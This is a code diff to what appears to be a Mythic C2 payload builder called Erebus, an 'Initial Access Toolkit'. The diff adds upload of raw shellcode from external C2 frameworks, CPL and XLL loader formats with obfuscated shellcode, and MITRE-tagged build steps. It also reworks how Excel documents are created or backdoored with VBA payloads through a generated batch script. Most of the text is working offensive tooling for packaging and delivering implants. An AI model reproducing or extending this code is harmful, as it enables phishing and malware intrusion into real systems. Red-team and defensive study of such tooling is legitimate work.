@@ -115,7 +115,7 @@ FINAL_PAYLOAD_EXTENSIONS = [
 class ErebusWrapper(PayloadType):
     name = "erebus_wrapper"
     author = "@Lavender-exe, @hunterino-sec"
-    semver = "v0.0.1"
+    semver = "v0.0.2"
     note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"
 
     file_extension = "zip"
@@ -150,6 +150,33 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
+            name = "0.0a Enable Custom Shellcode",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Upload custom raw shellcode from an external C2 (e.g. Cobalt Strike, Havoc, Sliver). "
+                "When enabled the Mythic-wrapped payload is ignored and the uploaded file is used as "
+                "the shellcode source. The file must be raw position-independent shellcode - "
+                "PE files (MZ header) are rejected."
+            ),
+            default_value = False,
+            required = False,
+        ),
+
+        BuildParameter(
+            name = "0.0b Custom Shellcode File",
+            parameter_type = BuildParameterType.File,
+            description = (
+                "Raw shellcode blob to use instead of the Mythic-wrapped payload "
+                "(e.g. a .bin produced by msfvenom, CS payload generator, etc.). "
+                "Must be raw shellcode - PE files will be rejected."
+            ),
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0a Enable Custom Shellcode", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
             name = "0.1 Loader Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the type of loader to use",
@@ -163,8 +190,14 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         BuildParameter(
             name = "0.2 Loader Format",
             parameter_type = BuildParameterType.ChooseOne,
-            description = f"Select the loader's filetype",
-            choices = ["exe", "dll"],
+            description = (
+                "Select the loader's output format. "
+                "exe = standard PE executable. "
+                "dll = DLL (side-loadable, regsvr32). "
+                "cpl = Control Panel applet (loaded via control.exe or double-click). "
+                "xll = Excel Add-In DLL (xlAutoOpen trigger)"
+            ),
+            choices = ["exe", "dll", "cpl", "xll"],
             default_value = "exe",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
@@ -694,8 +727,8 @@ appdomain (self)""",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Output format for the VBA maldoc. "
-                "xlsm: macro-enabled workbook (Linux ZIP injection, immediate). "
-                "xlsx/xlam: requires erebus_helper on a Windows host (deferred via build_maldoc.bat)."
+                "All formats require erebus_helper on a Windows host (deferred via build_maldoc.bat). "
+                "xlsm: macro-enabled workbook. xlsx: workbook saved as xlsm. xlam: Excel add-in."
             ),
             choices=["xlsm", "xlsx", "xlam"],
             default_value="xlsm",
@@ -1248,14 +1281,23 @@ generated if none have been entered.""",
         BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                   step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),
 
+        BuildStep(step_name = "[T1218.002] - Compiling CPL Payload",
+                  step_description = "Compiling CPL Applet with Obfuscated Shellcode"),
+
+        BuildStep(step_name = "[T1559.002] - Compiling XLL Add-In",
+                  step_description = "Compiling XLL Add-In DLL with Obfuscated Shellcode"),
+
         BuildStep(step_name = "[T1027] - Compiling Shellcode Loader",
-            step_description = "Compiling Shellcode Loader with Obfuscated Raw Agent Shellcode"),
+            step_description = "Compiling Shellcode Loader"),
 
         BuildStep(step_name = "[T1027] - Compiling ClickOnce Loader",
-            step_description = "Compiling ClickOnce Loader with Obfuscated Raw Agent Shellcode"),
+            step_description = "Compiling ClickOnce Loader"),
 
         BuildStep(step_name = "[T1553.006] - Sign Shellcode Loader",
             step_description = "Signing the Shellcode Loader with a code signing certificate"),
+
+        BuildStep(step_name = "[T1566.001] - Creating MalDoc",
+                  step_description = "Creating or backdooring Excel document with VBA payload"),
 
         BuildStep(step_name = "[T1137.006] - Adding Trigger",
                   step_description = "Creating trigger to execute given payload"),
@@ -1265,9 +1307,6 @@ generated if none have been entered.""",
 
         BuildStep(step_name = "[T1036.008] - Creating Decoy",
                   step_description= "Creating a placeholder decoy file"),
-
-        BuildStep(step_name = "[T1566.001] - Creating MalDoc",
-                  step_description = "Creating or backdooring Excel document with VBA payload"),
 
         BuildStep(step_name = "[T1027] - Containerising",
                   step_description = "Adding payload into chosen container"),
@@ -1525,8 +1564,10 @@ generated if none have been entered.""",
 
             environment = Environment(loader=FileSystemLoader(templates_path))
 
-            # Validate wrapped_payload before writing
-            if self.wrapped_payload is None:
+            custom_sc_enabled = self.get_parameter("0.0a Enable Custom Shellcode")
+
+            # Validate wrapped_payload - only required when not using custom shellcode
+            if self.wrapped_payload is None and not custom_sc_enabled:
                 response.status = BuildStatus.Error
                 response.build_stderr = "No wrapped payload provided. The wrapped_payload is None."
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -1537,16 +1578,57 @@ generated if none have been entered.""",
                 ))
                 return response
 
+            # Write Mythic payload as the initial shellcode source (may be overridden below)
             with open(mythic_shellcode_path, "wb") as file:
-                file.write(self.wrapped_payload)
+                if self.wrapped_payload is not None:
+                    file.write(self.wrapped_payload)
+
+            # Custom shellcode override - replaces the Mythic payload entirely
+            if custom_sc_enabled:
+                custom_sc_uuid = self.get_parameter("0.0b Custom Shellcode File")
+                if not custom_sc_uuid:
+                    response.status = BuildStatus.Error
+                    response.build_stderr = "Custom Shellcode is enabled but no file was uploaded."
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="[T1005] - Gathering Files",
+                        StepStdout="Custom shellcode enabled but no file provided.",
+                        StepSuccess=False
+                    ))
+                    return response
+
+                custom_sc_resp = await SendMythicRPCFileGetContent(
+                    MythicRPCFileGetContentMessage(AgentFileId=custom_sc_uuid)
+                )
+                if not custom_sc_resp.Success or not custom_sc_resp.Content:
+                    response.status = BuildStatus.Error
+                    response.build_stderr = "Failed to retrieve custom shellcode file from Mythic."
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="[T1005] - Gathering Files",
+                        StepStdout="Failed to retrieve custom shellcode file.",
+                        StepSuccess=False
+                    ))
+                    return response
+
+                with open(mythic_shellcode_path, "wb") as file:
+                    file.write(custom_sc_resp.Content)
+
+                output += "[+] Custom shellcode loaded - Mythic wrapped payload ignored.\n"
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="[T1005] - Gathering Files",
+                    StepStdout=f"Custom shellcode loaded ({len(custom_sc_resp.Content)} bytes). Mythic payload overridden.",
+                    StepSuccess=True
+                ))
 
             if os.stat(mythic_shellcode_path).st_size == 0:
                 response.status = BuildStatus.Error
-                response.build_stderr = "Failed to write Mythic Shellcode to placeholder file."
+                response.build_stderr = "Shellcode file is empty - nothing to process."
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
                         StepName="[T1005] - Gathering Files",
-                        StepStdout="Failed to write Mythic Shellcode to placeholder file.",
+                        StepStdout="Shellcode file is empty after write.",
                         StepSuccess=False
                     ))
                 return response
@@ -2054,7 +2136,7 @@ generated if none have been entered.""",
                     encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
                     config_data = {
                         "TARGET_PROCESS": "",
-                        "INJECTION_TYPE": 3,  # CreateFiber (self-injection) — DLL runs in the hijacked process
+                        "INJECTION_TYPE": 3,  # CreateFiber (self-injection) - DLL runs in the hijacked process
                         "COMPRESSION_TYPE": compression_type_value,
                         "ENCODING_TYPE": encoding_type_value,
                         "ENCRYPTION_TYPE": encryption_type_value,
@@ -2160,6 +2242,12 @@ generated if none have been entered.""",
                         if loader_format == "dll":
                             compile_step_name = "[T1027.011] - Compiling DLL Payload"
                             compile_step_msg = "DLL Loader Compiled!"
+                        elif loader_format == "cpl":
+                            compile_step_name = "[T1218.002] - Compiling CPL Payload"
+                            compile_step_msg = "CPL Loader Compiled!"
+                        elif loader_format == "xll":
+                            compile_step_name = "[T1559.002] - Compiling XLL Add-In"
+                            compile_step_msg = "XLL Add-In Compiled!"
                         else:
                             compile_step_name = "[T1027] - Compiling Shellcode Loader"
                             compile_step_msg = "Shellcode Loader Compiled!"
@@ -2960,34 +3048,21 @@ static size_t key_len = sizeof(key);
                         bas_output = payload_dir / f"{doc_name}_payload.bas"
                         _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)
 
-                        if maldoc_fmt == "xlsm":
-                            # Linux ZIP injection — immediate, best-effort
-                            excel_output = payload_dir / f"{doc_name}.xlsm"
-                            templates_dir = Path(agent_build_path) / "templates"
-                            template_xlsx = templates_dir / "template.xlsx"
-                            excel_path = generate_excel_payload(
-                                payload_path=str(payload_dir),
-                                vba_payload=vba_code,
-                                output_path=excel_output,
-                                template_path=template_xlsx if template_xlsx.exists() else None
-                            )
-                            success_msg = f"Created Excel document (xlsm): {excel_path.name}"
-                        else:
-                            # xlsx/xlam — deferred via helper on Windows host
-                            excel_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
-                            bat_lines = [
-                                "@echo off",
-                                f"REM Inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows).",
-                                f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"',
-                                "echo MalDoc created: %errorlevel%",
-                            ]
-                            bat_path = payload_dir / "build_maldoc.bat"
-                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
-                            success_msg = (
-                                f"VBA exported to {bas_output.name}. "
-                                f"Run build_maldoc.bat on a Windows host to produce {excel_output.name}."
-                            )
-                            output += f"[+] Generated build_maldoc.bat for Windows-side {maldoc_fmt.upper()} injection\n"
+                        # All formats deferred via helper on Windows host - COM injection required
+                        excel_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
+                        bat_lines = [
+                            "@echo off",
+                            f"REM Inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows).",
+                            f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"',
+                            "echo MalDoc created: %errorlevel%",
+                        ]
+                        bat_path = payload_dir / "build_maldoc.bat"
+                        bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
+                        success_msg = (
+                            f"VBA exported to {bas_output.name}. "
+                            f"Run build_maldoc.bat on a Windows host to produce {excel_output.name}."
+                        )
+                        output += f"[+] Generated build_maldoc.bat for Windows-side {maldoc_fmt.upper()} injection\n"
 
                     else:  # Backdoor Existing
                         maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
@@ -3024,39 +3099,22 @@ static size_t key_len = sizeof(key);
                         bas_output = payload_dir / f"{doc_name}_payload.bas"
                         _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)
 
-                        if maldoc_fmt == "xlsm":
-                            # Linux ZIP injection — temp file, immediate
-                            temp_excel = Path(tempfile.gettempdir()) / f"source_{excel_uuid}.xlsx"
-                            temp_excel.write_bytes(file_resp.Content)
-
-                            output_name = f"{Path(original_filename).stem}_backdoored.xlsm"
-                            excel_output = payload_dir / output_name
-
-                            excel_path = backdoor_existing_excel(
-                                source_excel=str(temp_excel),
-                                vba_payload=vba_code,
-                                output_path=excel_output
-                            )
-
-                            temp_excel.unlink(missing_ok=True)
-                            success_msg = f"Backdoored Excel document (xlsm): {excel_path.name}"
-                        else:
-                            # xlsx/xlam — deferred via helper on Windows host
-                            output_name = f"{Path(original_filename).stem}_backdoored.{maldoc_fmt}"
-                            excel_output = payload_dir / output_name
-                            bat_lines = [
-                                "@echo off",
-                                f"REM Backdoor existing Excel file with VBA via erebus_helper (run on Windows).",
-                                f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_excel_name}" --output "{excel_output.name}" --module-name "{doc_name}"',
-                                "echo MalDoc created: %errorlevel%",
-                            ]
-                            bat_path = payload_dir / "build_maldoc.bat"
-                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
-                            success_msg = (
-                                f"VBA exported to {bas_output.name}. "
-                                f"Run build_maldoc.bat on a Windows host to produce {excel_output.name}."
-                            )
-                            output += f"[+] Generated build_maldoc.bat for Windows-side {maldoc_fmt.upper()} backdooring\n"
+                        # All formats deferred via helper on Windows host - COM injection required
+                        output_name = f"{Path(original_filename).stem}_backdoored.{maldoc_fmt}"
+                        excel_output = payload_dir / output_name
+                        bat_lines = [
+                            "@echo off",
+                            f"REM Backdoor existing Excel file with VBA via erebus_helper (run on Windows).",
+                            f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_excel_name}" --output "{excel_output.name}" --module-name "{doc_name}"',
+                            "echo MalDoc created: %errorlevel%",
+                        ]
+                        bat_path = payload_dir / "build_maldoc.bat"
+                        bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
+                        success_msg = (
+                            f"VBA exported to {bas_output.name}. "
+                            f"Run build_maldoc.bat on a Windows host to produce {excel_output.name}."
+                        )
+                        output += f"[+] Generated build_maldoc.bat for Windows-side {maldoc_fmt.upper()} backdooring\n"
 
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
